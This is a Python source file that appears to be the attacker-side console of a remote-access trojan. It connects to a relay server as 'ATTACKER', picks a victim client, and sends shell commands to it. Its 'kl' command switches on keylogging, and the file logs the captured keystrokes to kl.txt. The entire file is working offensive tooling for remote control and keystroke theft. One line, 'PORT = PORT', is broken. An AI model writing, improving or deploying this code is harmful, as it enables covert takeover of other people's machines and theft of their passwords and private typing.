import socket

HEADER = 1024
PORT = PORT
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
SERVER = "your public IP here dont remove quotes"
ADDR = (SERVER, PORT)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)


def append_new_line(text_to_append):
    with open("kl.txt", "a+") as file_object:
        file_object.seek(0)
        data = file_object.read(10)
        if len(data) > 0:
            file_object.write("\n")
        file_object.write(text_to_append)


def send(msg):
    message = msg.encode(FORMAT)
    client.send(message)


def recieve():
    klactive = False
    while True:
        mes = (client.recv(1024))
        if mes:
            recieved = mes.decode(FORMAT)
            if "<sep>" in recieved:
                cwd, output = recieved.split("<sep>")
                print("output: " + output)
                if not klactive:
                    sendinput = input(cwd + "$>")
                    if sendinput:
                        if sendinput == "kl":
                            klactive = True
                        send(sendinput)
                    if not sendinput:
                        send(" ")
            if "<kl>" in recieved:
                append_new_line(recieved.strip("<kl>"))
                print(recieved.strip("<kl>"))


selectclient = input("select client: ")
# ATTACKET:CLIENT1
send("ATTACKER:" + str(selectclient))
while True:
    send("cd")
    mes1 = (client.recv(HEADER))
    mess = mes1.decode(FORMAT)
    if mess:
        break

send("cd")
recieve()
